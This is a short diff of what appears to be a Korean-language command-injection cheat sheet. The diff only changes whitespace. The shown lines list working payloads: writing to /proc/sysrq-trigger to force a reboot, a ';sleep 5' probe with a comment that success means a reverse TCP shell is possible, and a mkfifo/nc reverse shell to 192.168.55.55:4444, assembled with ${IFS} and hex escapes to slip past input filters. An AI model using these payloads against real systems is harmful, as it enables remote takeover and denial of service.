@@ -16,8 +16,8 @@ id>/etc/systemd/
 echo 'b'>/proc/sysrq-trigger  
 <<<b>/proc/sysrq-trigger  
 root일 경우만 덮어씌울수있음.  
---------------------------------------------
-;sleep 5 # 해당 명령어가 먹힐 경우 리버스tcp 가능
+--------------------------------------------  
+;sleep 5 # 해당 명령어가 먹힐 경우 리버스tcp 가능  
 ;mkfifo${IFS}/opt/f;  
 ;printf${IFS}'nc\x20192.168.55.55\x204444'>/opt/b;  
 ;printf${IFS}'\x20</opt/f\x7Cbin/sh>/opt/f'>/opt/c;  
